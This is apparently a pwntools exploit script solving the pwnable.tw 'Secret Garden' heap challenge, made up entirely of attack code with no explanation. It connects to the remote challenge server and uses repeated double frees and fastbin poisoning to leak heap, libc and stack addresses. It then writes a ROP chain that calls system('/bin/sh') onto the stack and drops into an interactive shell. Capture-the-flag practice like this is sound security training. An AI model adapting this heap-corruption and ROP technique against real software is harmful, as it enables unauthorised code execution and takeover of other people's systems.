from pwn import *

exe = context.binary = ELF('./secretgarden_patched', checksec=False)
libc = ELF('./libc_64.so.6', checksec=False)
# r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#         #    b*0x55555540108d
#         #    c
#         #    c 34
#         ni
#         ni 3
#         b
#         c
#         c 30
#            ''')

r = remote('chall.pwnable.tw', 10203)

def malloc(size, name = b'a', color = b'a'):
    r.sendlineafter(b'choice : ', b'1')
    r.sendlineafter(b'name :', str(size).encode('utf-8'))
    r.sendlineafter(b'of flower :', name)
    r.sendlineafter(b'the flower :', color)
    
def free(id):
    r.sendlineafter(b'choice : ', b'3')
    r.sendlineafter(b'garden:', str(id).encode('utf-8'))

def choice(choice):
    r.sendlineafter(b'choice : ', str(choice).encode('utf-8'))

libc_off = 0x3c3b78
libc.sym['pop_rdi'] = 0x21102
libc.sym['ret'] = 0x937


size = 32
malloc(0x500)
malloc(size)
malloc(size)
malloc(size)
free(1)
free(2)
free(1)
free(3)
malloc(size, b'')
choice(2)
r.recvuntil(b'flower[4] :')
out = r.recv(6)
heap = u64(out + b'\x00'*2)
print(hex(heap))
free(4)
free(3)
malloc(size, p64(heap - 0x14fa - 0x10))
malloc(size*2, b'hello')
free(0)
malloc(size, b'\x01')
choice(2)
r.recv(23)
out = r.recv(6)
libc_leak = u64(out + b'\x00'*2)
libc.address = libc_leak - libc_off
print(hex(libc.address))

free(1)
free(2)
free(1)
free(3)
malloc(size, p64(heap - 0x14fa - 0x10))
malloc(size+16)
payload = p64(1) + p64(libc.sym['environ'])
malloc(size, payload)

choice(2)
r.recv(23)
out = r.recv(6)
stack = u64(out + b'\x00'*2)
print(hex(stack))

free(1)
free(2)
free(1)
free(3)
malloc(size, p64(0))

size = 96
stack_off = 379
malloc(size)
malloc(size)
free(12)
free(13)
free(12)
malloc(size, p64(stack - stack_off - 16))
malloc(size)
malloc(size)
payload = b'a'*43 + p64(libc.sym['pop_rdi']) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
r.sendlineafter(b'choice : ', b'1')
r.sendlineafter(b'name :', str(size).encode('utf-8'))
r.sendlineafter(b'of flower :', payload)

r.interactive()